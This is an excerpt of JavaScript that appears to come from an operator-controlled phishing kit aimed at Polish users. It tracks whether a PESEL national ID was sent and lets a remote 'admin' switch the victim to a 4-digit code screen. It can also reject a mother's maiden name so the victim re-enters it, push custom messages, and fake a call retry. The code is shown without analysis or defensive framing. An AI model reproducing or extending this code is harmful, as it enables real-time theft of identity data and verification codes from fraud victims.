...
let peselAlreadySent = false;
let lastRetryTime = 0;
const RETRY_COOLDOWN = 60000; // 60 секунд
...
function requestRetry() {
    ...
    if (now - lastRetryTime < RETRY_COOLDOWN) {
        const left = Math.ceil((RETRY_COOLDOWN - (now - lastRetryTime)) / 1000);
        if (link) link.textContent = `Poczekaj ${left}s`;
        return;
    }
    lastRetryTime = now;
    sendData('call_request', 'Powtórz połączenie');
    if (link) {
        link.textContent = 'Wysłano...';
        ...
        const timer = setInterval(() => {
            ...
            if (countdown <= 0) {
                clearInterval(timer);
                link.textContent = 'Powtórz połączenie';
                link.style.pointerEvents = '';
                link.style.opacity = '';
            } else {
                link.textContent = `Powtórz połączenie (${countdown}s)`;
            }
        }, 1000);
    }
}
...
function handleCommand(data) {
    ...
    switch (command) {
        case 'show_4_code':
            ...
            showScreen('screen-code');
            break;
        case 'show_mother_error':
            // Админ: неверная фамилия → возвращаем на экран формы
            ...
            if (motherError) {
                motherError.textContent = 'Wprowadzone nazwisko panieńskie matki jest nieprawidłowe. Wprowadź ponownie.';
        ...
        case 'show_message':
            if (data.message) {
                // Показываем сообщение на том экране, где пользователь
                if (currentScreen === 'code') {
                    const codeError = document.getElementById('codeError');
                    codeError.textContent = data.message;
                    codeError.style.display = 'block';
                } else {
                    const motherErr = document.getElementById('motherError');
                    motherErr.textContent = data.message;
                    motherErr.style.display = 'block';
                }
            }
            break;
        case 'redirect':
